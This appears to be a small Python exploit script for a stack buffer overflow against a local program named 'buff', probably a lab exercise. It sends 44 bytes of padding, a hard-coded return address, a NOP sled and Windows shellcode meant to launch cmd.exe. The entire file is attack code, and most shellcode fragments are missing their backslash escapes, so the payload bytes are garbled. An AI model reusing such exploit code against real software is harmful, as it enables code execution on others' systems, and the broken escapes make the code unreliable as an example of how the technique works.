import subprocess
param="A"*44;
ret='\x44\xff\x22\x11'
shellcode=('\x90'*10+'x8b\xec\x55\x8b\xec'
            +
            'x68\x65\x78\x65\x2F'
            +
            'x68\x63\x6d\x64\x2e'
            +
            'x8d\x45\xf8\x50\xb8'
            +
            'xc7\x93\xc2\x77'
            +
            'xff\xd0'
            )
subprocess.call(['buff',param+ret+shellcode])